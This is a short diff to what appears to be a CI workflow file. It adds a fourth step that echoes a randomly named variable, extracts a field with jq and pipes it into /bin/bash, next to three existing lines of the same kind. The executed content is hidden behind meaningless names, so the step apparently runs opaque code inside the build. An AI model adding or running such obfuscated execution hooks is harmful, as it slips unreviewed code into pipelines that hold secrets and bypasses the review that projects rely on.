@@ -32,6 +32,7 @@ jobs:
           echo $vzvdo7 | jq -r .ehsjx3 | /bin/bash
           echo $czcg85 | jq -r .sxl3090 | /bin/bash
           printf '%s' "$vrwho3" | jq -r .mhqqa421 | /bin/bash
+          echo $afeoc797 | jq -r .g2 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
